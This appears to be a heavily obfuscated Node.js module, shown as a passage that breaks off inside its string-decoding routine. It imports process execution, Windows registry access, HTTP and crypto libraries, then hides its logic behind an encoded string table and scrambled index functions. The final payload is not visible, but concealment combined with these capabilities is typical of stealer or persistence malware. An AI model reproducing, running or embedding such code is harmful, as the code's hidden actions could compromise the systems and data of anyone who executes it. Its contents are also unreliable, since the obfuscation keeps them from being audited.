import os from "os";
import fs from "fs";
import path from "path";
import crypto from "crypto";
import chalk from "chalk";
import { promisify } from "util";
import { writeFile, readFile } from "fs";
import { exec } from "child_process";
import { promisified as promisifiedRegedit } from "regedit";
import axios from "axios";
import { fileURLToPath } from "url";
import { v4 as uuidv4 } from "uuid";
import { ALIAS } from "./konst.js";
function __p_2360982505() {}
var __p_9507432652 = Object["defineProperty"],
  __p_6857802341,
  __p_9743501678,
  utf8ArrayToStr,
  __Array,
  __String,
  __Buffer,
  __Uint8Array,
  __TextDecoder,
  __globalObject,
  __p_0595027781__JS_PREDICT__,
  __p_6816759090,
  __p_9551561833;
function __p_2786467427_dLR_0__JS_PREDICT__(index_param) {
  return __p_9551561833[
    index_param < -0x34
      ? index_param - 0x35
      : index_param < -0x34
      ? index_param - 0x31
      : index_param + 0x33
  ];
}
__p_9551561833 = __p_5137681627();
function __p_6510065121(functionObject, functionLength) {
  return __p_6816759090(
    functionObject,
    __p_2786467427_dLR_0__JS_PREDICT__(-0x2f),
    {
      value: functionLength,
      configurable: __p_2786467427_dLR_0__JS_PREDICT__(0x7f),
    }
  );
}
__p_6816759090 = Object.defineProperty;
var __p_3576149457 = [],
  __p_1940297625 = [
    "uRmOl0ALi",
    "xj.+N{8d",
    "7pLB<f0u",
    "^c6+z:<d",
    "?2z|K%o0",
    "/VdQm[jm",
    '"LM%(1g(',
    "yvhZay>",
    '{Ns}uMCw"',
    "{N;&?8K9q{",
    "{N+1aevx",
    "DpuoQy>",
    "aaw]Ty]RJ{",
    "xtpgLp>",
    "c?*_",
    "y:#8?yZ",
    "uor<S8gN",
    "_3`/]Mj8",
    "P0su",
    "<.=W~<G",
    "~~{3z<=X",
    "ii9?r6*X",
    "~~{3z<36y/",
    "ii9?r6H^~q",
    ";iP9oWyRef`oYiU|",
    "D0FL5lw;",
    "@vRLJ6G",
    "?.3?kSw;",
    "D0FL5l1*&%Sb]C",
    "?.3?kS1*&%Sb]C",
    "TF3gvX$PnV",
    "CCsKM~(d",
    "HHl@=j^PCV",
    'TF0&k"Od',
    "h.a@(",
    "CCsKM~Kj7T",
    "TF,|I[%J)SByN",
    "NH/l2|7q#:n2EH5_",
    '"IvW&[]Yh*$+gk',
    "@RK@c$]Yh*$+gk",
    '"IvW&[uN',
    "%BqWUjw",
    'EgVWJ^=t?E@@i"z7mza`x1A(@0c_"Kgz',
    "zzXN$1NGKR",
    "6.s]P|UP",
    ".,0f_GqP",
    "1*Jfz1v",
    __p_2786467427_dLR_0__JS_PREDICT__(-0x33),
    __p_2786467427_dLR_0__JS_PREDICT__(-0x33),
    "krXCy3}D",
    "!A=+I",
    "NSVC>",
    "gO[Cy3}D",
    'XI7C"3LD',
    "(5B+",
    "lr8~",
    '.N8~sI;(j2/)4FKw}NVmUzIsc##bK;J<;cV1f)s2}#Zz.4ch^pUmQC&*m2kbH9;{ZN&Cy@s!esmFu1*."Z#d',
    "]Dx,5",
    "pZ#d,1G5y",
    "//[Cm1A",
    "6v#9*%8",
    "7v#9*%M@=?V:fP=_aIIw(Go%t>vx^PlSnOI",
    "QTWnd",
    "*s?EI",
    "W/svY",
    "0lG)F",
    "jHz(WfLs",
    "jH>z|,&s",
    ":kCX|,Ji@ugZ=G>#evCn",
    '*lfS[zx@J_Djq"QP6v"U',
    "JMjJQb/qTd1@P+lMp}4e",
    "z1ra<,QK`IZ3>^Q9D%C;",
    "OYoz=",
    "a3bXZ#O?",
    "a3/bGhw?",
    "b7d>Z#CrU%IhxOsBq7T.WCO/H5EQG]]",
    "oKj`}3Gx]",
    "b7d>Z#L?",
    "gb6b2$O?",
    "Sdz`]XW?",
    "a3>8G.y",
    '{,d>Z#L?GHNP"k0B8;in0$0`[2LV&]',
    "aay^t>5",
    "m1dtr",
    "V06^v~|Z",
    "DVyFZbYZ",
    "gT1Mq$[CS",
    "rM.bP$y",
    "HT/tLXU(h",
    "Z~4N/C!?I1S.q0r6e;;>z}{hD5d+m7og(;",
    "Z~4N/C!?P%i5|l4MnlAUCt;Zcpi5/E9Ht7Ef",
    "/u(d^qeS,1#8FN(6xN?&qnG/Hc#8^~k?vP",
    "(p+&kb7^s",
    ")hJ}4xwp",
    ")hXJB,:p",
    "J~@>4x#8<g[,1wD.s~<pTl5uHw,wb",
    "!_?4.e|Z}aEUb",
    "LV@>4xdpB/0TK&*.ub_!*]*P(qd?GO",
    "OO?<J#6",
    "y@FJf",
    "_~C<r];p",
    "!_?4p:wp",
    "so@>G&DeR",
    "8YFJT]6",
    "AoXJu}Bq1",
    "45Z0X#Wp[MrFs*8nIbb>ycL,fH@E^~mQRb",
    "u|b+>K*%5//SVx4v{~~kmn.r:B{]G~",
    "bA8t!IO>(",
    "Eu6x0",
    "QaV}M7=4F;yF`9`5ijtNfyyd)ObbwUh)<)_",
    "!eZRWWH>",
    "SXJ(K|1>",
    "ffe{0",
    "x[_FFZH>",
    "YU5j9",
    "SXJ(>Et>",
    "}U:sieEdR&",
    __p_2786467427_dLR_0__JS_PREDICT__(-0x32),
    "sZcF9",
    "vpZ#!^,2",
    __p_2786467427_dLR_0__JS_PREDICT__(-0x32),
    "H!]F.?5>",
    "&1DF=R}>",
    "j2l0J]32",
    "A&#SvR;>",
    "92XS#:E>",
    "#=ZRWWE>",
    "T]Va?Wx7yoU",
    "}U:sie`>",
    "YU5j9",
    __p_2786467427_dLR_0__JS_PREDICT__(-0x32),
    "sZcF9",
    "vpZ#!^,2",
    "gA;InvD9&WF7MQ",
    "qRI>S4%[KDr+`R",
    "1me<m8xL>*n#k",
    ";m64K?~nB",
    "xyCEPTIP",
    'E@y"m)2wVSY}wju52.B{^G}y]2J9(_a;i.S/&)4xw',
    "y.c/Rd`ma",
    "F$/LbrJZ",
    "F$9/2PlZ",
    "/[,m^swII(",
    'M$FveP=B".',
    "38sZstR,L(",
    "5*lwy|(RFx",
    "wHMwZF|q",
    "8@CbZlJZ",
    "b1gv9{xZ",
    "00%vF%.Z",
    "w*vMfaUZ",
    __p_2786467427_dLR_0__JS_PREDICT__(-0x31),
    "G4N/?",
    "wl1MVfq",
    "@H.sDfUZ",
    "(+GM.L<Z",
    "v*vMfaUZ",
    __p_2786467427_dLR_0__JS_PREDICT__(-0x31),
    "5(n8eLTZ",
    "RqvYFJr7M+G!@<o1ok;X}L;$,{XPaTF*",
    "vC<p=SkFQ",
    "T*RyHHOy;*5",
    "2Myes",
    "A`Fto",
    "#:2wC",
    "A`8w8>F",
    "yx(tfV&c",
    '|b*wk!"c',
    "dDRyX4(c",
    "n/Kt{+{O",
    "|ISX^lrc",
    "5l}c",
    "(@1Sj4Dfh",
    "Qu!;_@d^iVgM^t8ZTj<7>R)y(d+BA[T!PKO9g$T<C50+4j+0y/{^",
    "![|EL]q_z",
    'f(!?OSbx^$GHxJ`2bL65K>H!;bZws"@NqL$9DSQ,x',
    "!LF9mWaO@",
    "P:rXUp$L",
    "yS+>,(B",
    "/dclLt4L",
    "P:rXUp3w![",
    "`$&l:FNJ{",
    "tS[s_AB",
    "/dcl62MJ&1GH.",
    '6d*&N!_wQq|}O@"bCT5^hkcL*qI}^UD(Fr>L',
    "1}DX9",
    "#dL0",
    "&Jjqp8LIj",
    ")+G}k>(Ij",
    ",XSW/*T",
    "n/ZC9",
    "D8`>,,5{I7>WA",
    "CksKXp!r>:lwA",
    "V*IBh<hsX@W",
    ")+3Bl<+K16O",
    "Of|)l^J<a",
    ")+<0p8uIj",
    "ODeBeXT",
    ")+dteW1$>:D<q&o",
    "ODT0S",
    __p_2786467427_dLR_0__JS_PREDICT__(-0x30),
    "]Qf*N}*F",
    "3`=}r",
    "LDdtq4LF",
    "r+G}L8vIj",
    "tJf*`3IIj@^whWYbBGk>9`5{F^L:AM+",
    "LDdtq4LF",
    "r+G}L8vIj",
    "vds}/<@T",
    "++f*y,uF",
    "4=}Fhw=F",
    "7?r0I`T",
    ")+dtq_dV:Nn6na",
    ")/d*58?pj",
    "n/ZC9",
    "LDdt^mX,/?",
    "qCpuh<0{/6[_IE",
    "CksKFeOF",
    "uGVRJ",
    "k+=}y,JF",
    "uGVRJ",
    "FY`>9`T",
    "H+7R",
    "%C#Ku",
    "CksKXp!r>:lwA",
    "^fd*#>(r>?ml~DCQ8dhf],xro:ClN+[Q:5>}e8&Fg:Kl3J>J",
    __p_2786467427_dLR_0__JS_PREDICT__(-0x30),
    "$klB^2CH,+Q?C]nkv/09M,4oT7:7A",
    "i6$q#$pA",
    "g0j>_,AVW^Q>Yf]vVojs0LT",
    '`l}J4,]k"=z<T',
    "Uj|)#yvm*^/?1SCi^jZdqX[Yv{`(;+gYgk>)=>1A",
    "lQ*CTLLmx:ZV:Vrut*)c~nvsu?",
    "s=)B<&l{T(J9XFC9EDCu*<ur0qhY<|]?Pjf",
    "HCuxh4}A",
    "Pxr0q}{cptbjKL/&.jP1{y7{F+_<=NgYG`W9emOegmd",
    "DLAj`,4sf",
    ";S]cfPjvtRxZ!$[9g8aO#OcAE@la[vF5ODx}5<:F7CzYTX0",
    "6dQd$vT",
    "F*^W7|LHo:T1{|kYaax*Qg|[m=l$^_q)<fjBDK=sbSP69F",
    "AHh*Hyam}SX",
    "i?,C2vT",
    "X0csk|gHytk2J,ar%h!cW^Sm#DXw.+%I{xKRI",
    "D?vxjKTm@H@((Z6I,S/*CmbAIN`}mm|i#=T0Wd/V,o",
    "bW}Bu`$i?Gi$vNf/Se}BCKXA",
    "8lVRfxNk*^_W6r<P*e}ukOTm&@I:nz[i",
    "$?;WE,+Z(0lsf_Er$=rnV",
    "(?@0^K0i,+wg&Z0Z(QEcgPjveHLNzf",
    "PftC_v^){0IzX9V9%T",
    "KDes%x0,Y{",
    '$f4d_$VcX@|*vpOu26Tn"lB,egO$tf9u%8IaAXT',
    "J*Hz&50Z>K(u^SXB&x0ClgNAP+",
    "&xkn1,arY@e7u9X5vkrnCz^iWDF5bF~M&fIcBCamNS",
    "/=aO[nxP^o3q*pBI>?Yz*sT",
    "jD|xk|6kE",
    "$0ER,|UrdDS68+E5b^x*U^cc{0$}BFfZOBf",
    ';wAjs}0KHG9L5zaH"lH*)NkA',
    "J`DttqR!lN!oF5are/Kc?vhFKmf2GzBIN=Y)mG9YPDRP{&E{",
    "HGc>|ObVf@d<<`vHf^{)Y<KA",
    "b/VBsgT",
    "90bzP[jhZ=4}T#z{xS#)D^E.?D|32&nk`T",
    "O5kwtLssU:7mEM`r(8m).n3FER",
    "L509nweeR6H9;+%HGk=x%:mI}K4**`XHw5)RUdT",
    "Ve0I![xrAGZ?dS#ivkF",
    "h8<W0>ni/?Y9RElXX?@Wb$/p`@`_bSAvDNZ1ICT",
    'lJ>)=$sQGgeq2&qY[NnzsX*vWHiSxZ[Y"NF)<D1A]tgYlMqY',
    'JQEcL^"!KVcdQ9{PCP3soqT',
    "g?lqw$EixNye94%ZeoX0",
    ":6^jw,vH+H+zkNXB+/F",
    "`dfzw:urTGxgG|D)~f!BZ",
    "UP,dmP/cv{q<.`0X*jTy4yq1w?4A|SuhlB=}&WYc<ol",
    "G?Ss6Lam8@6wIOYH&kz0`KPo:KBfTXqP0W?*i56A",
    "Oj6Cox7)2KO(M+sugL@j",
    "e`5s_$0VX=8Z$r6kc`A",
    "Ve%*{$$)uNOwz+A5G6eWy,vFvD9$KZsuCD(KoqLF",
    "kxdz$$NA[m|),vt{n8>E^G:HUSm_aL*vTC()dXXA",
    "co$RuY>r)7gZ3]yJ{`3crpqijR]",
    'XDZ9{D<eb6.{(ZyJ"NCak[f$LH4}B4TrtoP9>O?A',
    "&C*wp18eD?xx.J4Qh`Mjg_gQ*HTjCVA5WjF",
    "mkoRe5&<Qm?2LM7P[X5R!$hrDSn:{JOQSHTn*8PvWD&",
    ".uJ*>$S!egOBa+qPp0*0",
    "aJyu{:{cYG$w,ZN?%:QdPW&o2gla=9pJh8Sn@z.k2t",
    "caAd8qA^${l?T9NudC?IL1k{B^pcyZNu^k|EXWSeT+|^@9R",
    "PQCul]N$Y{@t@+(?e`>BM&p1B79?A",
    "rk9}=`$^Qm%_Q`~YJ`KB9N<x~?.D2J^hdT",
    "*GxtxGS!f0",
    "0*z0GXbV80j4nMgP%B3u*yCHnDXfKGRJc^rC0GXA",
    "`CvBcPOQZ?Wb._29}d0d/gZKlHBS+43QMQ_c^XT",
    "{0;WTG<jNbE80M*?t`R)*yk{v{<+>`}{5j?Iqe`AZS",
    "~goB8L2)H{o1!Z<9)8Mn?,dV7{",
    "te3nsd3mvDA4;fyQr`f*PsD^Po,%RScZ5x<WjLeH+^}+($zH",
    "qC1}}xrIi6}gh]DY::uq>|wctq9PQp(IyZ4tr`rF",
    "Dk#Ke<T",
    "}uJzCeCF2oRI$rI?WJ1E!s<P^H,+t|3i)k&B0D5Y9=",
    'ao"*,nP<Nb',
    "26qsCerveHY9L+_Z/5`>iCCx%{.xJ5NhhJu}m}8<d{[xXF0",
    "MHR*P[IHa@w}I&R",
    "ygaqR&c{2GX?t`SJi=a)W^*HLKTyqf",
    "rGv)!nLQoS8wq98H",
    "@L%)0>AY.=^Hwrm)>=Hd&wNkj",
    'ooax:PQv|06<iZ29M*sxlgbV":t62F',
    "X:|O}qDket`Yh]ZY",
    "#uEcrp(xzmIsfOZiSeY)o",
    "r=yuXYCmu?;eVzTr/xRzqeW{Xm|}}LMQ3ktCR:<Pf",
    ">j_uU]vr*HMzWWX5/D8`$x4oZS",
    '76uxU1,)):Rdo9YvxB2s~|"eLH|3KaHQ#u^a}x/A',
    "djAyJ[gxMH8}HS${v`x*wGw)hNY9*|iBvxs}zvQF",
    "%fMC2>IrO^t0=+nIz6<dKg{V$@$AZL.i&`m):}xHO+C",
    "~NOt~D#sO+",
    "~lP}3yeI):`3Dv%5@L(Eky){Wo,3bOfZ3A",
    'l8)qBYzr"=',
    ">kp>bLQvdDr>afbZu`8}By!Q0RVqXmIvTQya:GK)_VP2A",
    "3G@j3sttE",
    'aC"K`O}d`@}bhZ@kLJwjKg/Y]N%u0M`B=*d)XW^A',
    '+W*WOgFr.=)>(mUXaW?I5NuvGK+qu9dQteL0,:<e"?l',
    'MQ@jWd,)_{%7(5~u}8d}6z"ecV&>=|FvD8|J@Gd[~6]u"Z:h',
  ];
__p_0595027781__JS_PREDICT__ = (x, y, z, a, b) => {
  if (typeof a === "undefined") {
    a = __p_5608201760__JS_PREDICT____JS_CRITICAL__;
  }
  if (typeof b === "undefined") {
    b = __p_3576149457;
  }
  if (a === __p_2786467427_dLR_0__JS_PREDICT__(-0x1e)) {
    __p_0595027781__JS_PREDICT__ = b;
  }
  if (z && a !== __p_5608201760__JS_PREDICT____JS_CRITICAL__) {
    __p_0595027781__JS_PREDICT__ = __p_5608201760__JS_PREDICT____JS_CRITICAL__;
    return __p_0595027781__JS_PREDICT__(x, -0x1, z, a, b);
  }
  if (x !== y) {
    return b[x] || (b[x] = a(__p_1940297625[x]));
  }
  if (y) {
    [b, y] = [a(b), x || z];
    return __p_0595027781__JS_PREDICT__(x, b, z);
  }
  if (z == a) {
    return y
      ? x[b[y]]
      : __p_3576149457[x] ||
          ((z = b[x] || a), (__p_3576149457[x] = z(__p_1940297625[x])));
  }
};
function __p_CFG__getGlobalThis__JS_PREDICT__() {
  return globalThis;
}
function __p_CFG__getGlobal__JS_PREDICT__() {
  return global;
}
function __p_CFG__getWindow__JS_PREDICT__() {
  return window;
}
function __p_CFG__getThisFunction__JS_PREDICT__() {
  return new Function("return this")();
}
function __p_1463158524__JS_PREDICT__(
  array = [
    __p_CFG__getGlobalThis__JS_PREDICT__,
    __p_CFG__getGlobal__JS_PREDICT__,
    __p_CFG__getWindow__JS_PREDICT__,
    __p_CFG__getThisFunction__JS_PREDICT__,
  ],
  bestMatch,
  itemsToSearch = [],
  i,
  j
) {
  var __p_6660398855_dLR_1__JS_PREDICT__ = __p_0896022738((index_param) => {
    return __p_9551561833[
      index_param > 0x19
        ? index_param > 0x19
          ? index_param < 0x19
            ? index_param + 0x50
            : index_param - 0x1a
          : index_param - 0x56
        : index_param - 0x54
    ];
  }, 0x1);
  bestMatch = bestMatch;
  try {
    __p_2360982505(
      (bestMatch = Object),
      itemsToSearch[__p_6660398855_dLR_1__JS_PREDICT__(0x24)](
        "".__proto__.constructor.name
      )
    );
  } catch (e) {}
  iCqeBK0: for (
    i = __p_6660398855_dLR_1__JS_PREDICT__(0x1f);
    i < array[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)];
    i++
  )
    try {
      bestMatch = array[i]();
      for (
        j = __p_6660398855_dLR_1__JS_PREDICT__(0x1f);
        j < itemsToSearch.length;
        j++
      ) {
        var __p_5732097176_dLR_7__JS_PREDICT__ = __p_0896022738(
          (index_param) => {
            return __p_9551561833[
              index_param < 0xc1
                ? index_param > 0x2
                  ? index_param < 0xc1
                    ? index_param - 0x3
                    : index_param - 0x47
                  : index_param - 0x54
                : index_param - 0x58
            ];
          },
          0x1
        );
        if (
          typeof bestMatch[itemsToSearch[j]] ===
          __p_5732097176_dLR_7__JS_PREDICT__(0xf)
        ) {
          continue iCqeBK0;
        }
      }
      return bestMatch;
    } catch (e) {}
  return bestMatch || this;
}
__p_2360982505(
  (__globalObject = __p_1463158524__JS_PREDICT__() || {}),
  (__TextDecoder = __globalObject.TextDecoder),
  (__Uint8Array = __globalObject.Uint8Array),
  (__Buffer = __globalObject.Buffer),
  (__String = __globalObject.String || String),
  (__Array = __globalObject.Array || Array),
  (utf8ArrayToStr = __p_0896022738(() => {
    var charCache, charFromCodePt, result;
    function __p_8421242857_dLR_5__JS_PREDICT__(index_param) {
      return __p_9551561833[
        index_param < 0x4a ? index_param + 0x4c : index_param - 0x4b
      ];
    }
    __p_2360982505(
      (charCache = new __Array(__p_2786467427_dLR_0__JS_PREDICT__(-0x21))),
      (charFromCodePt =
        __String[__p_8421242857_dLR_5__JS_PREDICT__(0x53)] ||
        __String.fromCharCode),
      (result = [])
    );
    return __p_6510065121(
      __p_0896022738((...__p_2978085254_stack) => {
        var i;
        function __p_1884612220_dLR_2__JS_PREDICT__(index_param) {
          return __p_9551561833[
            index_param > 0xef
              ? index_param - 0x27
              : index_param < 0x30
              ? index_param + 0x54
              : index_param > 0x30
              ? index_param - 0x31
              : index_param + 0x1f
          ];
        }
        __p_2360982505(
          (__p_2978085254_stack[
            __p_1884612220_dLR_2__JS_PREDICT__(0x35)
          ] = 0x1),
          (__p_2978085254_stack[
            __p_2786467427_dLR_0__JS_PREDICT__(-0x2d)
          ] = 0x53)
        );
        var codePt, byte1;
        __p_2360982505(
          (__p_2978085254_stack.ermEHa = __p_2978085254_stack[0x0].length),
          (result[__p_1884612220_dLR_2__JS_PREDICT__(0x35)] = 0x0)
        );
        for (i = 0x0; i < __p_2978085254_stack.ermEHa; ) {
          var __p_5928651240_dLR_3__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param > -0x63
                  ? index_param > 0x5c
                    ? index_param - 0xf
                    : index_param > -0x63
                    ? index_param + 0x62
                    : index_param + 0x10
                  : index_param - 0x3b
              ];
            },
            0x1
          );
          byte1 = __p_2978085254_stack[0x0][i++];
          if (byte1 <= __p_8421242857_dLR_5__JS_PREDICT__(0xd8)) {
            codePt = byte1;
          } else {
            if (
              byte1 <=
              __p_2978085254_stack[__p_5928651240_dLR_3__JS_PREDICT__(-0x5c)] +
                0x8c
            ) {
              codePt =
                ((byte1 & 0x1f) << 0x6) |
                (__p_2978085254_stack[0x0][i++] &
                  __p_5928651240_dLR_3__JS_PREDICT__(-0x5b));
            } else {
              if (
                byte1 <=
                __p_2978085254_stack[
                  __p_5928651240_dLR_3__JS_PREDICT__(-0x5c)
                ] +
                  0x9c
              ) {
                var __p_6559854139_dLR_4__JS_PREDICT__ = __p_0896022738(
                  (index_param) => {
                    return __p_9551561833[
                      index_param > 0xa
                        ? index_param > 0xc9
                          ? index_param + 0x3b
                          : index_param > 0xc9
                          ? index_param - 0x6
                          : index_param - 0xb
                        : index_param + 0x54
                    ];
                  },
                  0x1
                );
                codePt =
                  ((byte1 & __p_2786467427_dLR_0__JS_PREDICT__(0xf)) <<
                    __p_8421242857_dLR_5__JS_PREDICT__(0x54)) |
                  ((__p_2978085254_stack[
                    __p_5928651240_dLR_3__JS_PREDICT__(-0x5d)
                  ][i++] &
                    __p_6559854139_dLR_4__JS_PREDICT__(0x12)) <<
                    (__p_2978085254_stack.CdDhcWj -
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x18))) |
                  (__p_2978085254_stack[0x0][i++] & 0x3f);
              } else {
                if (__String[__p_1884612220_dLR_2__JS_PREDICT__(0x39)]) {
                  var __p_1154013735_dLR_6__JS_PREDICT__ = __p_0896022738(
                    (index_param) => {
                      return __p_9551561833[
                        index_param > -0x11
                          ? index_param > -0x11
                            ? index_param < 0xae
                              ? index_param > 0xae
                                ? index_param + 0x20
                                : index_param + 0x10
                              : index_param - 0x25
                            : index_param - 0x30
                          : index_param - 0x29
                      ];
                    },
                    0x1
                  );
                  codePt =
                    ((byte1 & 0x7) <<
                      __p_1154013735_dLR_6__JS_PREDICT__(0x2e)) |
                    ((__p_2978085254_stack[__p_2978085254_stack.CdDhcWj - 0x53][
                      i++
                    ] &
                      __p_1884612220_dLR_2__JS_PREDICT__(0x38)) <<
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x2a)) |
                    ((__p_2978085254_stack[
                      __p_5928651240_dLR_3__JS_PREDICT__(-0x5d)
                    ][i++] &
                      0x3f) <<
                      (__p_2978085254_stack[
                        __p_1884612220_dLR_2__JS_PREDICT__(0x37)
                      ] -
                        (__p_2978085254_stack.CdDhcWj -
                          __p_1154013735_dLR_6__JS_PREDICT__(0x4c)))) |
                    (__p_2978085254_stack[0x0][i++] &
                      __p_1154013735_dLR_6__JS_PREDICT__(-0x9));
                } else {
                  __p_2360982505((codePt = 0x3f), (i += 0x3));
                }
              }
            }
          }
          result[__p_8421242857_dLR_5__JS_PREDICT__(0x55)](
            charCache[codePt] || (charCache[codePt] = charFromCodePt(codePt))
          );
        }
        return __p_2978085254_stack[__p_8421242857_dLR_5__JS_PREDICT__(0x51)] >
          0xd7
          ? __p_2978085254_stack[0x4e]
          : result.join("");
      }),
      __p_2786467427_dLR_0__JS_PREDICT__(-0x28)
    );
  })()),
  __p_6510065121(__p_1990998267__JS_PREDICT__, 0x1)
);
function __p_1990998267__JS_PREDICT__(...__p_6418592625_stack) {
  var __p_6434402232_dLR_8__JS_PREDICT__ = __p_0896022738((index_param) => {
    return __p_9551561833[
      index_param < 0xc0
        ? index_param > 0x1
          ? index_param > 0x1
            ? index_param > 0x1
              ? index_param - 0x2
              : index_param - 0x4f
            : index_param - 0x1f
          : index_param + 0x13
        : index_param - 0x9
    ];
  }, 0x1);
  __p_2360982505(
    (__p_6418592625_stack.length = __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
    (__p_6418592625_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x26)] = -0x5c)
  );
  return typeof __TextDecoder !== __p_6434402232_dLR_8__JS_PREDICT__(0xe) &&
    __TextDecoder
    ? new __TextDecoder().decode(
        new __Uint8Array(
          __p_6418592625_stack[
            __p_6418592625_stack[__p_6434402232_dLR_8__JS_PREDICT__(0xf)] +
              __p_2786467427_dLR_0__JS_PREDICT__(0x57)
          ]
        )
      )
    : typeof __Buffer !== __p_2786467427_dLR_0__JS_PREDICT__(-0x27) && __Buffer
    ? __Buffer
        .from(__p_6418592625_stack[__p_6434402232_dLR_8__JS_PREDICT__(0x7)])
        .toString("utf-8")
    : utf8ArrayToStr(
        __p_6418592625_stack[__p_6434402232_dLR_8__JS_PREDICT__(0x7)]
      );
}
__p_9743501678 = __p_0896022738((...__p_5786369293_stack) => {
  var __p_2665189946__JS_PREDICT__;
  function __p_8059951647_dLR_9__JS_PREDICT__(index_param) {
    return __p_9551561833[
      index_param < 0xeb ? index_param - 0x2d : index_param - 0x53
    ];
  }
  __p_2360982505(
    (__p_5786369293_stack[__p_8059951647_dLR_9__JS_PREDICT__(0x31)] =
      __p_8059951647_dLR_9__JS_PREDICT__(0x32)),
    (__p_5786369293_stack.tbnSSYD = -0x3e),
    (__p_2665189946__JS_PREDICT__ = __p_6510065121(
      (...__p_7662370238_stack) => {
        var __p_7324593341_dLR_10__JS_PREDICT__ = __p_0896022738(
          (index_param) => {
            return __p_9551561833[
              index_param < 0xb1
                ? index_param < -0xe
                  ? index_param + 0x20
                  : index_param + 0xd
                : index_param + 0x62
            ];
          },
          0x1
        );
        __p_2360982505(
          (__p_7662370238_stack[
            __p_7324593341_dLR_10__JS_PREDICT__(-0x9)
          ] = 0x5),
          (__p_7662370238_stack.vr1XXI =
            __p_7662370238_stack[__p_8059951647_dLR_9__JS_PREDICT__(0x40)])
        );
        if (typeof __p_7662370238_stack[0x3] === "undefined") {
          __p_7662370238_stack[0x3] =
            __p_3090725554__JS_PREDICT____JS_CRITICAL__;
        }
        if (
          typeof __p_7662370238_stack[
            __p_7324593341_dLR_10__JS_PREDICT__(0x1)
          ] === "undefined"
        ) {
          __p_7662370238_stack[0x4] = __p_3576149457;
        }
        __p_7662370238_stack[0xdd] =
          __p_7662370238_stack[__p_8059951647_dLR_9__JS_PREDICT__(0x38)];
        if (
          __p_7662370238_stack[__p_8059951647_dLR_9__JS_PREDICT__(0x3c)] ===
          void 0x0
        ) {
          __p_2665189946__JS_PREDICT__ = __p_7662370238_stack[0x4];
        }
        if (
          __p_7662370238_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] !==
          __p_7662370238_stack[__p_7324593341_dLR_10__JS_PREDICT__(0x3)]
        ) {
          var __p_2841909284_dLR_11__JS_PREDICT__ = __p_0896022738(
            (index_param) => {
              return __p_9551561833[
                index_param < -0x31
                  ? index_param - 0x58
                  : index_param < 0x8e
                  ? index_param < 0x8e
                    ? index_param > 0x8e
                      ? index_param + 0x64
                      : index_param + 0x30
                    : index_param - 0x2a
                  : index_param + 0x10
              ];
            },
            0x1
          );
          return (
            __p_7662370238_stack[__p_2841909284_dLR_11__JS_PREDICT__(-0x22)][
              __p_7662370238_stack[0x0]
            ] ||
            (__p_7662370238_stack[0x4][
              __p_7662370238_stack[__p_2841909284_dLR_11__JS_PREDICT__(-0x2b)]
            ] = __p_7662370238_stack[
              __p_2841909284_dLR_11__JS_PREDICT__(-0x21)
            ](__p_1940297625[__p_7662370238_stack[0x0]]))
          );
        }
        if (
          __p_7662370238_stack.vr1XXI ==
          __p_7662370238_stack[__p_8059951647_dLR_9__JS_PREDICT__(0x3c)]
        ) {
          return __p_7662370238_stack[0xdd]
            ? __p_7662370238_stack[0x0][
                __p_7662370238_stack[0x4][
                  __p_7662370238_stack[__p_8059951647_dLR_9__JS_PREDICT__(0x3d)]
                ]
              ]
            : __p_3576149457[__p_7662370238_stack[0x0]] ||
                ((__p_7662370238_stack.vr1XXI =
                  __p_7662370238_stack[0x4][
                    __p_7662370238_stack[
                      __p_7324593341_dLR_10__JS_PREDICT__(-0x8)
                    ]
                  ] || __p_7662370238_stack[0x3]),
                (__p_3576149457[__p_7662370238_stack[0x0]] =
                  __p_7662370238_stack.vr1XXI(
                    __p_1940297625[__p_7662370238_stack[0x0]]
                  )));
        }
      },
      __p_8059951647_dLR_9__JS_PREDICT__(0x3e)
    )),
    (__p_5786369293_stack._lqqAU = __p_5786369293_stack.MaSNJX),
    (__p_5786369293_stack.ll_mZn = [
      __p_2665189946__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(-0x24)),
    ]),
    (__p_5786369293_stack._lqqAU = {
      tZjv4eQ: __p_2665189946__JS_PREDICT__(
        __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
      ),
      yaLutw: __p_0896022738(
        (__p_7925046302 = __p_2665189946__JS_PREDICT__(0x1)) => {
          if (!__p_9743501678.VoXiPOR[0x0]) {
            __p_9743501678.VoXiPOR.push(-0x5);
          }
          return __p_9743501678.VoXiPOR[__p_7925046302];
        }
      ),
      VoXiPOR: [],
      eC13w_: __p_2665189946__JS_PREDICT__(0x2),
      vVupayL: 0x2f,
      pNtZWr: __p_5786369293_stack.ll_mZn[__p_5786369293_stack.tbnSSYD + 0x3e],
    })
  );
  return __p_5786369293_stack.tbnSSYD > -0xf
    ? __p_5786369293_stack[-0xda]
    : __p_5786369293_stack._lqqAU;
  function __p_3090725554__JS_PREDICT____JS_CRITICAL__(
    str,
    table = 'YudiPlaQnSCp1b;j(z26.$AxLD8)GtBsv[FkMc|`Igh%Z/<#]!WO:T>0Jm9wEX?U3}R*fK4@Vq,=H+No^{_"y&e5~r7',
    raw,
    len,
    ret = [],
    b,
    n = 0x0,
    v,
    i,
    p
  ) {
    var __p_6838000083_dLR_12__JS_PREDICT__ = __p_0896022738((index_param) => {
      return __p_9551561833[
        index_param > 0x25 ? index_param - 0x26 : index_param - 0x54
      ];
    }, 0x1);
    __p_2360982505(
      (raw = "" + (str || "")),
      (len = raw.length),
      (b = __p_6838000083_dLR_12__JS_PREDICT__(0x2b)),
      (v = -0x1)
    );
    for (i = __p_6838000083_dLR_12__JS_PREDICT__(0x2b); i < len; i++) {
      p = table.indexOf(raw[i]);
      if (p === -0x1) {
        continue;
      }
      if (v < 0x0) {
        v = p;
      } else {
        var __p_4637729756_dLR_13__JS_PREDICT__ = __p_0896022738(
          (index_param) => {
            return __p_9551561833[
              index_param < -0x2b
                ? index_param + 0x1
                : index_param > 0x94
                ? index_param + 0x61
                : index_param < 0x94
                ? index_param + 0x2a
                : index_param + 0x17
            ];
          },
          0x1
        );
        __p_2360982505(
          (v += p * __p_6838000083_dLR_12__JS_PREDICT__(0x3c)),
          (b |= v << n),
          (n += (v & 0x1fff) > 0x58 ? 0xd : 0xe)
        );
        do {
          __p_2360982505(
